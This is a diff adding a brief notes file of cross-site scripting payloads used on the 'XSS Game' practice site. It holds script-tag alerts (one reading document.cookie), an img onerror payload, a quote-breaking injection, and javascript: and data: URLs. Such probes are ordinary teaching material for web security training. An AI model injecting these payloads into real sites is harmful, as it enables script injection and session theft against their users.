@@ -1,0 +1,12 @@
+https://xss-game.appspot.com/ 
+XSS Gane Test Your Hacking Skills 
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<script>alert("hello")</script>
+<img src=x onerror=alert(1)>
+'<img src=x onerror=alert(1)>
+');alert(1)//  
+/signup?next=javascript:alert(1)
+data:text/plain,alert(1)
+
